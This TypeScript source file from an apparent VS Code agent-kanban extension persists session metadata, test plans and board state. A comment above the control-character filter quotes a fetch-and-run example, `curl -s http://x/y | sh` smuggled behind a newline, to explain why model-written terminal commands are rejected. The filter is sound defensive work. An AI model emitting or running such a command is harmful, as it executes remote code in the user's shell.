/** Per-session metadata that Claude Code does not store for us.
 *
 * Claude Code owns the session and its transcript. It has no concept of a board
 * phase, our tags, or which worktree a session belongs to — so we keep a
 * sidecar, the same shape Nimbalyst keeps in its `ai_sessions.metadata` JSON
 * column.
 *
 * The sidecar lives in the extension's global storage, NEVER in the repository.
 * That was the original mistake: board state is not source code, and writing it
 * into the working tree meant every agent turn produced a git diff.
 *
 * Archiving is a soft flag, as in Nimbalyst — archived sessions leave the board
 * but the transcript survives, because Claude Code still owns it.
 */
import { promises as fs } from 'node:fs'
import * as path from 'node:path'
import { MODEL_WINDOWS } from './usage.ts'
import { parseRuntimeId, type RuntimeId } from '../agent/runtime.ts'
import {
  parseOrchestrationLevel,
  type DecompositionRecord, type OrchestrationLevel, type ProposalRule,
} from '../board/decomposition.ts'

export type EffortLevel = 'low' | 'medium' | 'high' | 'xhigh' | 'max'
export type ThinkingMode = 'enabled' | 'disabled'

export const EFFORT_LEVELS: { key: EffortLevel; label: string }[] = [
  { key: 'low', label: 'Low' },
  { key: 'medium', label: 'Medium' },
  { key: 'high', label: 'High' },
  { key: 'xhigh', label: 'xHigh' },
  { key: 'max', label: 'Max' },
]

/**
 * The picker's options. The `agentsKanban.model` default MUST be one of these
 * ids, or the composer shows a nameless agent — smoke.mjs asserts exactly that.
 *
 * `context` is the label under the picker, and it is DERIVED from the window
 * table in `usage.ts` rather than written out again here. It used to be its own
 * string, and said 200K for all three when two of them are 1M. Now there is one
 * place to edit, and a label that disagrees with the meter beside it is not
 * expressible.
 *
 * The label is still not what the live meter measures against: that is the
 * window the SDK reports per run (`modelUsage[].contextWindow`), which is
 * authoritative and can be smaller. The table is the fallback for a session
 * with no run left to ask — see MODEL_WINDOWS.
 *
 * Ids are the canonical undated forms. `claude-haiku-4-5-20251001` also works,
 * but dated suffixes are not the documented ids and drift as snapshots move.
 */
export const MODELS: { id: string; label: string; context: string }[] = [
  { id: 'claude-opus-5', label: 'Opus 5' },
  { id: 'claude-sonnet-5', label: 'Sonnet 5' },
  { id: 'claude-haiku-4-5', label: 'Haiku 4.5' },
].map((m) => ({ ...m, context: windowLabel(MODEL_WINDOWS[m.id]) }))

/** `1M`, `200K` — the picker's shorthand for a window size. */
export function windowLabel(tokens: number | undefined): string {
  if (!tokens) return '?'
  if (tokens >= 1_000_000) return `${Math.round(tokens / 1_000_000)}M`
  return `${Math.round(tokens / 1000)}K`
}

/**
 * How to test what an agent built.
 *
 * An agent that parks its card in a review column and says nothing has handed
 * the user a puzzle: which files, run what, look where. So the phase move now
 * carries the answer, and the board renders it as something you can click.
 *
 * `kind` decides what clicking does, which is why it is a closed set:
 *  - `file`    a path inside the worktree — opens in the editor
 *  - `command` a shell line — opens a terminal already in the worktree
 *  - `url`     an address — opens in the browser
 */
export type TestLinkKind = 'file' | 'command' | 'url'

export interface TestLink {
  label: string
  target: string
  kind: TestLinkKind
}

export interface TestPlan {
  summary: string
  steps: string[]
  links: TestLink[]
  at: number
}

/** As long as a card title gets to be before it is cut short. */
export const MAX_TITLE = 72

/**
 * A card title fit to be shown and to be turned into a directory name.
 *
 * Shared by `titleFrom()`, which derives one from a prompt, and the `set_title`
 * tool, which takes one from the agent — so a title the agent chose and a title
 * we guessed are bounded the same way.
 *
 * Casing is left exactly as written. Capitalising the first letter turns `npm
 * run verify` into `Npm run verify`, and a card title that looks mangled is
 * worse than one that looks lowercase.
 */
export function normaliseTitle(raw: string): string {
  const t = raw
    .replace(/\s+/g, ' ')
    .trim()
    // Models quote titles about a third of the time. The quotes are not part of it.
    .replace(/^["'`“”‘’]+|["'`“”‘’]+$/g, '')
    .trim()
    // A trailing full stop is noise on a card; `?` and `!` are not.
    .replace(/[.,;:]+$/, '')
    .trim()
  if (t.length <= MAX_TITLE) return t
  // Cut on a word boundary. The old slice left titles ending mid-word — "figure
  // out how everything works a…" — which reads as a corrupted string rather
  // than a shortened one.
  const room = t.slice(0, MAX_TITLE - 1)
  const at = room.lastIndexOf(' ')
  return (at > MAX_TITLE / 3 ? room.slice(0, at) : room).replace(/[\s,;:.-]+$/, '') + '…'
}

export function normaliseTestPlan(raw: unknown): TestPlan | undefined {
  if (!raw || typeof raw !== 'object') return undefined
  const r = raw as Record<string, unknown>
  const summary = typeof r.summary === 'string' ? r.summary.trim() : ''
  const steps = Array.isArray(r.steps)
    ? r.steps.filter((s): s is string => typeof s === 'string' && !!s.trim()).map((s) => s.trim())
    : []
  const links: TestLink[] = Array.isArray(r.links)
    ? (r.links as unknown[]).flatMap((l) => {
        if (!l || typeof l !== 'object') return []
        const o = l as Record<string, unknown>
        const target = typeof o.target === 'string' ? o.target.trim() : ''
        if (!target) return []
        // Dropped, not sanitised. A link whose target had to be rewritten
        // before it was safe cannot be shown honestly — the button's label is
        // model-written too, so the user would be told one thing and given
        // another. `trim()` only ever stripped the OUTSIDE, which is why a
        // newline in the middle survived to reach the user's shell. Filtered
        // here, on the parse, so a plan stored by an older build is filtered on
        // the way back out as well.
        if (!targetIsClean(target)) return []
        const kind: TestLinkKind =
          o.kind === 'file' || o.kind === 'command' || o.kind === 'url' ? o.kind : guessLinkKind(target)
        const label = typeof o.label === 'string' && o.label.trim() ? o.label.trim() : target
        return [{ label, target, kind }]
      })
    : []
  if (!summary && !steps.length && !links.length) return undefined
  return {
    summary,
    steps,
    links,
    at: typeof r.at === 'number' ? r.at : Date.now(),
  }
}

/**
 * A decomposition record, parsed rather than cast.
 *
 * Read on the render path and written by a build that may be older than this
 * one, so the same rule as every other stored shape: a field this build cannot
 * read is dropped, and an unreadable record is no record at all rather than a
 * card claiming something nobody can verify.
 */
export function parseDecomposition(raw: unknown): DecompositionRecord | undefined {
  if (!raw || typeof raw !== 'object') return undefined
  const r = raw as Record<string, unknown>
  const level = parseOrchestrationLevel(r.level)
  const outcome = r.outcome === 'split' || r.outcome === 'refused' ? r.outcome : undefined
  const at = typeof r.at === 'number' && Number.isFinite(r.at) ? r.at : undefined
  const requested = typeof r.requested === 'number' && Number.isFinite(r.requested)
    ? Math.max(0, Math.floor(r.requested))
    : undefined
  if (!level || !outcome || at === undefined || requested === undefined) return undefined
  const RULES = ['one-piece', 'over-cap', 'scope-missing', 'brief-cross-reference', 'brief-too-long']
  return {
    at, level, outcome, requested,
    ...(typeof r.rule === 'string' && RULES.includes(r.rule) ? { rule: r.rule as ProposalRule } : {}),
    // Bounded on the way IN as well as at the tool, so a record written by an
    // older build cannot put an unbounded model string on the render path.
    ...(typeof r.stated === 'string' && r.stated.trim()
      ? { stated: r.stated.trim().slice(0, 240) }
      : {}),
  }
}

/**
 * Control characters, which a test-plan target may never contain.
 *
 * `target` is MODEL-WRITTEN, and a `command` link is handed to
 * `Terminal.sendText(target, false)`. The `false` means "do not append a
 * newline" — but a newline INSIDE the string is still a newline to the shell,
 * so `"curl -s http://x/y | sh\n# npm test"` executes the curl the instant the
 * button is pressed and leaves the comment typed at the prompt. The whole
 * safety argument for that branch was a comment above it saying the user "gets
 * to read it before pressing Enter", and that was false for any target with a
 * `\n` in it.
 *
 * It was also the only one of the three link kinds whose guard was prose:
 * `url` is refused unless the scheme is http(s), and `file` goes through
 * `realResolveInWorktree` and must stay inside the worktree. And it crossed the
 * permission boundary in the wrong direction — the terminal is the USER's
 * shell, unsandboxed and outside the worktree, while `set_phase` is
 * auto-allowed on the stated grounds that the board tools "only write to our
 * own sidecar". A sidecar write that becomes a shell execution on one click is
 * that justification failing.
 *
 * `\r` submits too (the pty maps CR to NL), and an escape sequence can rewrite
 * what the terminal shows before the user reads it — so this is every C0
 * control and DEL, not just the two newlines.
 */
const CONTROL_CHARS = /[ -]/

/** Is this target safe to store and to show? Defined ONCE, and used by both the
 *  parse that stores a test plan and the click that acts on one — a second copy
 *  of this predicate is the shape of bug this file already has a rule about. */
export function targetIsClean(target: string): boolean {
  return !CONTROL_CHARS.test(target)
}

/** Best guess when an agent omits `kind`, so a usable link is never dropped. */
export function guessLinkKind(target: string): TestLinkKind {
  if (/^https?:\/\//i.test(target)) return 'url'
  // A bare path with no spaces is a file; anything with an argument is a command.
  if (/^[\w./@~-]+$/.test(target) && /[./]/.test(target)) return 'file'
  return 'command'
}

/** One phase change, mirroring the tracker activity shape. */
export interface ActivityEntry {
  action: 'phase_changed' | 'tags_changed' | 'archived' | 'unarchived'
  oldValue?: string
  newValue?: string
  at: number
}

export interface SessionMeta {
  phase: string
  /**
   * Which agent program this session runs on — `claude`, `codex`.
   *
   * Persisted rather than defaulted, because a session's transcript lives in
   * its runtime's OWN store and no other runtime can read it: a card that came
   * back on the wrong agent after a restart would show an empty history and
   * resume nothing. Absent means the session predates this field, and the
   * default is Claude Code, which is what every existing session is.
   *
   * Read back in `all()` below. A field written and never parsed is not
   * persistence — `contextWindow` was exactly that for its whole life.
   */
  runtime?: RuntimeId
  tags: string[]
  archived: boolean
  pinned: boolean
  /** The worktree's directory. An EMPTY STRING means "no longer has one" —
   *  `undefined` cannot say that, because stripUndefined() drops it and the
   *  removed worktree's path would survive the patch that meant to clear it. */
  worktree?: string
  branch?: string
  /** The branch the worktree forked from — the other half of every diff and
   *  the target of the merge back. Without it a reloaded session can only guess. */
  base?: string
  /**
   * The session that split this one out of a larger task, if any.
   *
   * One level only, enforced in code: a subtask cannot split again. Stored on
   * the CHILD rather than as a list on the parent, because a card's key changes
   * when Claude Code assigns a session id — one pointer to repoint is a fact,
   * a list of them is a bookkeeping problem. `rename()` repoints it.
   */
  parent?: string
  /**
   * How many subtasks this card was split into, as APPROVED — not as started.
   *
   * The one thing a parent stores about its children, and deliberately a COUNT
   * rather than a list of keys, for the same reason `children[]` was rejected:
   * a card's key is its run id until Claude Code assigns a session id, so a key
   * list on the parent stops matching seconds into the first turn. A count
   * cannot go stale under `rename()`.
   *
   * It exists because `childrenOf()` cannot answer "how many are there". A
   * subtask held behind `maxConcurrentAgents` lives in the manager's in-memory
   * queue with no card, no worktree and no sidecar entry — and `MAX_SUBTASKS`
   * is 4 while the concurrency default is 3, so the last piece of a four-way
   * split is ALWAYS queued. The roll-up therefore saw 2 children of a 4-way
   * split, found every one of them settled, and told the user "All 2 subtasks
   * are ready for you to test" over two agents that had never run.
   *
   * Never cleared, so it needs no sentinel — unlike `worktree` (`''`) and
   * `running` (`0`), which `stripUndefined()` would otherwise strand.
   */
  fanout?: number
  /** How the user tests this session's work. Written by the agent when it moves
   *  into a review column; rendered on the card as clickable actions.
   *
   *  `null` in a PATCH clears it — see `CLEAR_TEST_PLAN`. It is never `null` in
   *  a stored entry; `normalise()` turns the sentinel into an absence. */
  testPlan?: TestPlan | null
  /**
   * The context window the last run of this session actually got.
   *
   * Written from the SDK's `modelUsage[].contextWindow`, which is the only
   * authoritative figure and can be SMALLER than the model's maximum — a
   * compaction policy may pin a 1M-window model to 200K. After a restart there
   * is no run left to ask, so this is what keeps the meter measuring against
   * the right denominator instead of the model table's optimistic one.
   */
  contextWindow?: number
  /**
   * When a run started, while it is still running. `0` means "not running".
   *
   * Zero rather than `undefined` for the same reason `worktree` uses an empty
   * string: `stripUndefined()` drops undefined from a patch, so `undefined`
   * cannot CLEAR anything — the mark would outlive every run that set it.
   *
   * Written when a run registers, cleared when it reaches a terminal state or
   * the user stops it. So a mark still on disk when the extension host starts
   * up means that run was killed mid-turn: a window reload, a reinstall, a
   * crash. The process cannot be re-attached — it is gone — but the session can
   * be resumed, and the board can at least stop pretending nothing happened.
   */
  running?: number
  /**
   * How eagerly this card should break itself into subtasks.
   *
   * Per SESSION, not per workspace, and the level in force when the session
   * LAUNCHED — `buildBrief()` bakes the matching sentence into the system
   * prompt once, and the split arrives a turn later, so the two must agree.
   * Someone with one huge objective and five trivial ones must not have to
   * toggle a setting and remember to toggle it back.
   */
  orchestration?: OrchestrationLevel
  /** The files this SUBTASK said it would touch, as declared at the split.
   *  A prediction, kept so it can be compared with what changed. */
  scope?: string[]
  /** Why this card became several — or why it did not. Written once, on the
   *  parent, at the moment of the decision. */
  decomposition?: DecompositionRecord
  /** Per-session overrides; unset means fall through to the workspace default. */
  model?: string
  effort?: EffortLevel
  thinking?: ThinkingMode
  activity: ActivityEntry[]
}

/** Keep the activity log bounded, as Nimbalyst does. */
const MAX_ACTIVITY = 100

export function emptyMeta(phase: string): SessionMeta {
  return { phase, tags: [], archived: false, pinned: false, activity: [] }
}

/**
 * A complete session cannot still be awaiting input. Normalising at every write
 * boundary stops the board, the card badge and the transcript disagreeing.
 */
/**
 * One sidecar entry, parsed rather than cast.
 *
 * The ONE place that knows how to read a stored entry — used by `all()` for our
 * own file and by `mergePreviousInstalls()` for a previous install's. It used
 * to be written out in `all()` and spread raw in the recovery path, which is
 * the two-parsers-one-shape version of the rule this project already has a
 * postmortem for.
 *
 * Returns undefined for anything that is not an object, so a corrupt entry is
 * skipped rather than becoming a card in the default column.
 */
export function parseMeta(v: unknown): SessionMeta | undefined {
  if (!v || typeof v !== 'object') return undefined
  const m = v as Partial<SessionMeta>
  const testPlan = normaliseTestPlan(m.testPlan)
  return normalise({
    phase: typeof m.phase === 'string' ? m.phase : 'planning',
    tags: Array.isArray(m.tags) ? m.tags.filter((t): t is string => typeof t === 'string') : [],
    archived: m.archived === true,
    pinned: m.pinned === true,
    ...(typeof m.worktree === 'string' ? { worktree: m.worktree } : {}),
    ...(typeof m.branch === 'string' ? { branch: m.branch } : {}),
    ...(typeof m.base === 'string' ? { base: m.base } : {}),
    ...(typeof m.parent === 'string' ? { parent: m.parent } : {}),
    ...(typeof m.fanout === 'number' && m.fanout > 0 ? { fanout: Math.floor(m.fanout) } : {}),
    ...(typeof m.running === 'number' && m.running > 0 ? { running: m.running } : {}),
    ...(typeof m.contextWindow === 'number' && m.contextWindow > 0 ? { contextWindow: m.contextWindow } : {}),
    // Parsed, not cast. This file outlives the extension VERSION that wrote it,
    // so an id from a build that served a runtime this one does not is another
    // program's output — and it is read on the render path.
    ...(parseRuntimeId(m.runtime) ? { runtime: parseRuntimeId(m.runtime)! } : {}),
    ...(testPlan ? { testPlan } : {}),
    // Parsed through the closed-union helper, never cast.
    ...(parseOrchestrationLevel(m.orchestration) ? { orchestration: parseOrchestrationLevel(m.orchestration)! } : {}),
    ...(Array.isArray(m.scope) && m.scope.some((s) => typeof s === 'string')
      ? { scope: m.scope.filter((s): s is string => typeof s === 'string' && !!s.trim()).map((s) => s.trim()) }
      : {}),
    ...(parseDecomposition(m.decomposition) ? { decomposition: parseDecomposition(m.decomposition)! } : {}),
    ...(typeof m.model === 'string' ? { model: m.model } : {}),
    // Closed unions, so a value from an older build cannot reach the picker.
    ...(EFFORT_LEVELS.some((e) => e.key === m.effort) ? { effort: m.effort as EffortLevel } : {}),
    ...(m.thinking === 'enabled' || m.thinking === 'disabled' ? { thinking: m.thinking } : {}),
    activity: Array.isArray(m.activity)
      ? (m.activity.filter((a) => !!a && typeof a === 'object') as ActivityEntry[])
      : [],
  })
}

export function normalise(m: SessionMeta): SessionMeta {
  const tags = [...new Set(m.tags.filter((t) => typeof t === 'string' && t.trim()))]
  const out = { ...m, tags, activity: m.activity.slice(-MAX_ACTIVITY) }
  // The clear sentinel never survives into a stored entry: it is an
  // instruction, not a value. `null` reaches here because `stripUndefined`
  // deliberately lets it through — that is what makes it able to clear.
  if (out.testPlan === CLEAR_TEST_PLAN) delete out.testPlan
  return out
}

export class MetaStore {
  private readonly file: string
  private readonly recovered: string
  private readonly log: ((message: string) => void) | undefined
  private cache: Record<string, SessionMeta> | undefined
  /**
   * The load in flight, so two cold callers get the SAME map.
   *
   * `all()` guarded on `this.cache`, which is assigned only after a `readFile`
   * and a `JSON.parse`. Two callers arriving in that window each built their
   * own object and the second assignment replaced the first — so `update()`,
   * `rename()` and `remove()`, which mutate the map `all()` handed them and
   * then serialise `this.cache`, could write a map that did not contain the
   * mutation. `update()` still resolved with the new value, so the caller was
   * told the write had succeeded and the very next `get()` returned the stale
   * one. That concurrency is reachable: `list()` runs `getAll()` inside a
   * `Promise.all`, `rollUpToParent` fans `card()` across every sibling, and
   * `launch()` calls `get()` and `patch()` while the first repaint is in
   * flight.
   *
   * `SessionStore.infos()` and `foreign()` already cache the PROMISE for
   * exactly this reason; this is the same fix one layer down.
   */
  private loading: Promise<Record<string, SessionMeta>> | undefined
  private writing: Promise<void> = Promise.resolve()
  private writeSeq = 0

  /** @param dir extension global storage; @param workspaceRoot scopes the file */
  constructor(dir: string, workspaceRoot: string, log?: (message: string) => void) {
    this.file = path.join(dir, 'sessions', `${encodeURIComponent(workspaceRoot)}.json`)
    // Which previous installs have already been merged in. One file, one list,
    // and the whole reason the merge below is safe to be additive.
    this.recovered = path.join(dir, 'sessions', '.recovered.json')
    this.log = log
  }

  /**
   * The same sidecar, written by a PREVIOUS incarnation of this extension.
   *
   * VS Code derives the global-storage path from `<publisher>.<name>`, so
   * renaming either gives the next install an empty directory — and the board
   * comes back with every phase, tag and test plan gone while Claude Code still
   * has all the sessions. Every card then falls to the default column, which is
   * what "all my tasks moved to Planning after reinstalling" was: this
   * extension shipped as `david.claude-kanban` and became
   * `smile1294.agents-kanban`.
   *
   * Siblings are scanned rather than a list of old ids being hardcoded, so the
   * NEXT rename costs nothing. It is a targeted probe, not a trawl of other
   * extensions' data: the only path looked at is
   * `<id>/sessions/<this workspace>.json`, a shape nothing but this code ever
   * writes. Newest wins, because a rename can happen twice.
   */
  private async recover(): Promise<{ text: string; from: string; at: number }[]> {
    // .../globalStorage/<publisher>.<name>/sessions/<workspace>.json
    const mine = path.dirname(path.dirname(this.file))
    const root = path.dirname(mine)
    const name = path.basename(this.file)
    const entries = await fs.readdir(root, { withFileTypes: true }).catch(() => [])
    const found: { text: string; from: string; at: number }[] = []
    for (const e of entries) {
      const dir = path.join(root, e.name)
      if (!e.isDirectory() || dir === mine) continue
      // VS Code names every extension's storage `<publisher>.<name>`, so a
      // directory without a dot is not one and cannot be a previous us. Cheap,
      // and it keeps the scan from ever reaching outside the shape it assumes —
      // which is not hypothetical: pointed at a temp directory, this happily
      // adopted a sibling left by an unrelated run.
      if (!e.name.includes('.')) continue
      const candidate = path.join(dir, 'sessions', name)
      const stat = await fs.stat(candidate).catch(() => undefined)
      if (!stat?.isFile()) continue
      const text = await fs.readFile(candidate, 'utf8').catch(() => '')
      if (!text.trim()) continue
      found.push({ text, from: candidate, at: stat.mtimeMs })
    }
    // Newest FIRST: the merge takes the first entry it sees for an id and skips
    // the rest, so ordering is what decides between two previous installs that
    // both remember the same session.
    return found.sort((a, b) => b.at - a.at)
  }

  /** The previous installs already merged in, so the merge happens once. */
  private async alreadyRecovered(): Promise<Set<string>> {
    const raw = await fs.readFile(this.recovered, 'utf8').catch(() => '')
    try {
      const parsed: unknown = raw ? JSON.parse(raw) : []
      return new Set(Array.isArray(parsed) ? parsed.filter((x): x is string => typeof x === 'string') : [])
    } catch {
      return new Set()
    }
  }

  private async all(): Promise<Record<string, SessionMeta>> {
    if (this.cache) return this.cache
    if (this.loading) return this.loading
    this.loading = this.load().finally(() => { this.loading = undefined })
    return this.loading
  }

  private async load(): Promise<Record<string, SessionMeta>> {
    let raw = ''
    try { raw = await fs.readFile(this.file, 'utf8') } catch { /* first run, or renamed */ }
    let parsed: unknown
    try { parsed = raw ? JSON.parse(raw) : {} } catch { parsed = {} }
    const out: Record<string, SessionMeta> = {}
    if (parsed && typeof parsed === 'object') {
      for (const [id, v] of Object.entries(parsed as Record<string, unknown>)) {
        const m = parseMeta(v)
        if (m) out[id] = m
      }
    }
    this.cache = out
    await this.mergePreviousInstalls(out)
    return out
  }

  /**
   * Fold in the board state of any previous install we have not seen before.
   *
   * ADDITIVE, and that is the point: an entry we already have always wins, and
   * only ids we have never heard of are taken. A session id is globally unique,
   * so an entry missing from our file cannot be about something else — and the
   * alternative is rendering that card in the default column, which is the bug.
   * A wholesale swap would be wrong the moment the new install has been used at
   * all, which is exactly the state the rename left behind: one session worked
   * on afterwards, four stranded behind a file that now exists.
   *
   * ONCE per source, recorded in `.recovered.json`. Merging on every load would
   * resurrect a session the user deleted, every single time they deleted it.
   *
   * Never fatal. The state is already in hand; failing here to report a copy
   * would throw away the thing being reported.
   */
  private async mergePreviousInstalls(out: Record<string, SessionMeta>): Promise<void> {
    try {
      const done = await this.alreadyRecovered()
      const found = (await this.recover()).filter((f) => !done.has(f.from))
      if (!found.length) return

      let added = 0
      for (const f of found) {
        done.add(f.from)
        let parsed: unknown
        try { parsed = JSON.parse(f.text) } catch { continue }
        if (!parsed || typeof parsed !== 'object') continue
        for (const [id, v] of Object.entries(parsed as Record<string, unknown>)) {
          if (out[id] || !v || typeof v !== 'object') continue
          // The SAME parser `all()` uses. This spread the previous install's
          // raw JSON with `...(v as SessionMeta)`, validating only `phase`,
          // `tags` and `activity` — twelve lines below a comment explaining
          // that parsing here is load-bearing because the file outlives the
          // version that wrote it. And these entries are written straight back
          // into OUR file and served to `store.list()`, whose consumers assume
          // the parsed shape: `archived` is used as a boolean, `running` has
          // `Date.now() -` done to it, `runtime` routes which transcript reader
          // to open, and `testPlan` reached the webview without ever passing
          // `normaliseTestPlan`. It was also the only path that could produce a
          // `pinned` that is not a boolean — and `pinned` is the board's
          // primary sort key.
          const parsedEntry = parseMeta(v)
          if (!parsedEntry) continue
          out[id] = parsedEntry
          added++
        }
      }

      if (added) {
        this.log?.(
          `Recovered ${added} board ${added === 1 ? 'card' : 'cards'} from a previous install of this ` +
          `extension (${found.map((f) => path.basename(path.dirname(path.dirname(f.from)))).join(', ')}). ` +
          'Renaming the extension moves its storage, and the phases were left behind.',
        )
        await this.flush(out)
      }
      await fs.mkdir(path.dirname(this.recovered), { recursive: true })
      await fs.writeFile(this.recovered, JSON.stringify([...done], null, 2), 'utf8')
    } catch (e) {
      this.log?.(`Could not check for board state from a previous install: ${String(e)}`)
    }
  }

  async get(id: string, defaultPhase = 'planning'): Promise<SessionMeta> {
    return (await this.all())[id] ?? emptyMeta(defaultPhase)
  }

  async getAll(): Promise<Record<string, SessionMeta>> {
    return { ...(await this.all()) }
  }

  /** Patch one session's metadata, recording phase and tag changes as activity. */
  async update(id: string, patch: Partial<SessionMeta>, defaultPhase = 'planning'): Promise<SessionMeta> {
    const all = await this.all()
    const before = all[id] ?? emptyMeta(defaultPhase)
    const activity = [...before.activity]

    if (patch.phase !== undefined && patch.phase !== before.phase) {
      activity.push({ action: 'phase_changed', oldValue: before.phase, newValue: patch.phase, at: Date.now() })
    }
    if (patch.tags !== undefined && patch.tags.join(',') !== before.tags.join(',')) {
      activity.push({ action: 'tags_changed', oldValue: before.tags.join(','), newValue: patch.tags.join(','), at: Date.now() })
    }
    if (patch.archived !== undefined && patch.archived !== before.archived) {
      activity.push({ action: patch.archived ? 'archived' : 'unarchived', at: Date.now() })
    }

    const next = normalise({ ...before, ...stripUndefined(patch), activity })
    all[id] = next
    // The map THIS call mutated, not whatever `this.cache` happens to hold.
    await this.flush(all)
    return next
  }

  /**
   * Move an entry from one key to another, merging into anything already there.
   *
   * Board state is keyed by `sessionId ?? runId`, because a run has no session
   * id for its first moment and may never get one. When the real id arrives,
   * whatever the agent already wrote under the run id has to follow it, or the
   * phase and test plan it recorded in that window are silently orphaned.
   */
  async rename(from: string, to: string): Promise<void> {
    if (from === to) return
    const all = await this.all()
    // Subtasks point at their parent by key, and a parent's key changes the
    // moment Claude Code assigns it a session id — which is exactly when this
    // runs. Repoint them here or every child is orphaned seconds after it
    // starts, still running, with nothing on the board joining it to anything.
    // Done before the early return: children can outlive a parent's own entry.
    let repointed = false
    for (const [k, m] of Object.entries(all)) {
      if (m.parent === from) { all[k] = { ...m, parent: to }; repointed = true }
    }
    const src = all[from]
    if (!src) { if (repointed) await this.flush(all); return }
    const dst = all[to]
    all[to] = normalise(
      dst
        // Anything already written under the real id is newer and wins; the
        // activity logs concatenate so neither half of the run is lost.
        ? { ...src, ...stripUndefined(dst as object) as Partial<SessionMeta>, activity: [...src.activity, ...dst.activity] } as SessionMeta
        : src,
    )
    delete all[from]
    await this.flush(all)
  }

  async remove(id: string): Promise<void> {
    const all = await this.all()
    delete all[id]
    await this.flush(all)
  }

  /** @param all the map to write. Passed in rather than read off `this.cache`,
   *  so a caller can never serialise somebody else's snapshot — see `loading`. */
  private async flush(all?: Record<string, SessionMeta>): Promise<void> {
    const snapshot = JSON.stringify(all ?? this.cache ?? {}, null, 2)
    const seq = ++this.writeSeq

    // Serialise writes so two rapid updates cannot interleave — but chain on
    // SETTLEMENT, not on success.
    //
    // This was `this.writing.then(write, () => {})`, which reads like "ignore
    // the previous failure". It does the opposite: when the previous write
    // rejected, the rejection handler ran INSTEAD of the write, so the next
    // update wrote nothing — and resolved, so its caller was told it had been
    // saved. One transient failure silently swallowed the phase change after it.
    const run = this.writing.then(
      () => this.writeFile(snapshot, seq),
      () => this.writeFile(snapshot, seq),
    )
    // The queue survives this write's outcome; the caller still hears about it.
    this.writing = run.then(() => {}, () => {})
    return run
  }

  private async writeFile(snapshot: string, seq: number): Promise<void> {
    await fs.mkdir(path.dirname(this.file), { recursive: true })
    // Unique per write: a shared temp name is only safe while the queue holds,
    // and the queue is exactly what fails under the condition above.
    const tmp = `${this.file}.${process.pid}.${seq}.tmp`
    try {
      await fs.writeFile(tmp, snapshot, 'utf8')
      await fs.rename(tmp, this.file)
    } catch (e) {
      await fs.rm(tmp, { force: true }).catch(() => {})
      throw e
    }
  }
}

function stripUndefined<T extends object>(o: T): Partial<T> {
  return Object.fromEntries(Object.entries(o).filter(([, v]) => v !== undefined)) as Partial<T>
}

/**
 * The sentinel that CLEARS a test plan.
 *
 * `stripUndefined()` drops `undefined` from a patch, so `undefined` cannot
 * clear anything — which is exactly why `worktree` uses `''` and `running` uses
 * `0`. `testPlan` had the same need and no sentinel, so a plan recorded once
 * outlived the work it described forever: `patch(id, { testPlan: undefined })`
 * was a no-op, and `normaliseTestPlan` refuses to manufacture an empty plan, so
 * an agent explicitly retracting one was silently ignored. The panel could say
 * "here is how to test this" and could never say "that is out of date".
 *
 * `null` rather than a magic empty object, because it is the one value that is
 * both expressible in JSON and impossible to confuse with a real plan.
 */
export const CLEAR_TEST_PLAN = null

/** The level a session runs at: its own choice, then the workspace default,
 *  then `balanced`. The same order as `resolveEffort`, and the reason is the
 *  same — a picker showing one thing while the session ran at another. */
export function resolveOrchestration(
  session: unknown,
  workspaceDefault: unknown,
): OrchestrationLevel {
  return parseOrchestrationLevel(session)
    ?? parseOrchestrationLevel(workspaceDefault)
    ?? 'balanced'
}

/**
 * An explicit per-session value wins, then the workspace default, then nothing —
 * leaving the CLI on its own default. Skipping the last step is a real bug:
 * the picker shows "Max" while the session quietly runs at the CLI's "high".
 */
export function resolveEffort(session: unknown, workspaceDefault: EffortLevel | undefined): EffortLevel | undefined {
  const valid = (v: unknown): v is EffortLevel =>
    typeof v === 'string' && EFFORT_LEVELS.some((e) => e.key === v)
  if (valid(session)) return session
  if (valid(workspaceDefault)) return workspaceDefault
  return undefined
}

/**
 * "Extended: On" means OMIT the thinking option so the model runs its adaptive
 * default. Only "Off" sends anything, and some models reject `disabled`
 * outright — the caller falls back to omitting when that happens.
 */
export function resolveThinking(session: unknown, workspaceDefault: ThinkingMode | undefined): ThinkingMode {
  const valid = (v: unknown): v is ThinkingMode => v === 'enabled' || v === 'disabled'
  if (valid(session)) return session
  if (valid(workspaceDefault)) return workspaceDefault
  return 'enabled'
}
